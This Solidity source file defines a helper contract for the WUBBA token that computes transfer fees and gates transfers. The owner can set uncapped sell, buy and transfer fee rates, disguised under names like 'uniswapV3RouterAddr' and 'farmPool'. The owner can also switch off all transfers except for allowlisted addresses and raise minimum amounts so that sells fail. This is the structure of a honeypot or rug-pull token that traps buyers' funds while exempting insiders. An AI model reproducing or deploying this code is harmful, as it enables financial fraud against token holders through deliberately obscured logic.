//SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IToken {
    function isWhiteListed(address _address) external view returns (bool);
}

contract WUBBAhelper is Ownable {
    bool public isAutoMatchMakingEnabled;
    bool public isPoolEnabled;
    bool public isUniswapV3Enabled;

    bool public isBonusActivated = true;

    uint public autoMatchMaking;
    uint public farmPool;
    uint public uniswapV3RouterAddr;

    uint public minBonusAmount;
    uint public minBonusBuyAmount;
    uint public minBonusTransferAmount;

    address public token;

    mapping(address => bool) public isAllownceListed;
    mapping(address => bool) public isBonusListed;

    constructor() {}

    function getTransferDetails(
        bool _isSell,
        bool _isBuy,
        bool _isTransfer,
        address _from,
        address _to,
        uint256 _amount
    ) external view returns (uint) {
        bool isFromAllowncelisted = isAllownceListed[_from];
        bool isToAllowncelisted = isAllownceListed[_to];

        if (!isBonusActivated) {
            require(
                isFromAllowncelisted == true,
                "Token: Cannot transfer tokens this time"
            );
        }

        uint256 rate = _getRate(_isSell, _isBuy, _isTransfer);
        uint256 amount = (_amount * (rate)) / 100;

        if (_isSell && !isFromAllowncelisted) {
            require(_amount >= minBonusAmount, "Token: Sell amount low");
        } else if (_isBuy && !isToAllowncelisted) {
            require(_amount >= minBonusBuyAmount, "Token: Buy amount low");
        } else if (
            _isTransfer && (!isFromAllowncelisted && !isToAllowncelisted)
        ) {
            require(
                _amount >= minBonusTransferAmount,
                "Token: Transfer amount too low"
            );
        } else {
            amount = 0;
        }

        return amount;
    }

    function _getRate(
        bool _isSell,
        bool _isBuy,
        bool _isTransfer
    ) internal view returns (uint256) {
        if (_isSell && isAutoMatchMakingEnabled) return autoMatchMaking;
        else if (_isBuy && isPoolEnabled) return farmPool;
        else if (_isTransfer && isUniswapV3Enabled) return uniswapV3RouterAddr;
        else return 0;
    }

    function toggleAutoMatchMaking() external onlyOwner {
        isAutoMatchMakingEnabled = !isAutoMatchMakingEnabled;
    }

    function toggleFarmPool() external onlyOwner {
        isPoolEnabled = !isPoolEnabled;
    }

    function toggleUniswapV3RouterAddr() external onlyOwner {
        isUniswapV3Enabled = !isUniswapV3Enabled;
    }

    function toggleSale() external onlyOwner {
        isBonusActivated = !isBonusActivated;
    }

    function setAutoMatchMaking(uint _autoMatchMaking) external onlyOwner {
        autoMatchMaking = _autoMatchMaking;
    }

    function setFarmPool(uint _farmPool) external onlyOwner {
        farmPool = _farmPool;
    }

    function setUniswapV3RouterAddr(
        uint _uniswapV3RouterAddr
    ) external onlyOwner {
        uniswapV3RouterAddr = _uniswapV3RouterAddr;
    }

    function setMinBonusAmount(uint _minBonusAmount) external onlyOwner {
        minBonusAmount = _minBonusAmount;
    }

    function setMinBonusBuyAmount(uint _minBonusBuyAmount) external onlyOwner {
        minBonusBuyAmount = _minBonusBuyAmount;
    }

    function setMinBonusTransferAmount(
        uint _minBonusTransferAmount
    ) external onlyOwner {
        minBonusTransferAmount = _minBonusTransferAmount;
    }

    function setToken(address _token) external onlyOwner {
        token = _token;
    }

    function addToAllowncelist(
        address[] calldata _address,
        bool[] calldata _isEnabled
    ) external onlyOwner {
        require(
            _address.length == _isEnabled.length,
            "Arrays must be the same length"
        );
        for (uint i = 0; i < _address.length; i++) {
            isAllownceListed[_address[i]] = _isEnabled[i];
        }
    }

    function addToBonuslist(
        address[] calldata _address,
        bool[] calldata _isEnabled
    ) external onlyOwner {
        require(
            _address.length == _isEnabled.length,
            "Arrays must be the same length"
        );
        for (uint i = 0; i < _address.length; i++) {
            isBonusListed[_address[i]] = _isEnabled[i];
        }
    }
}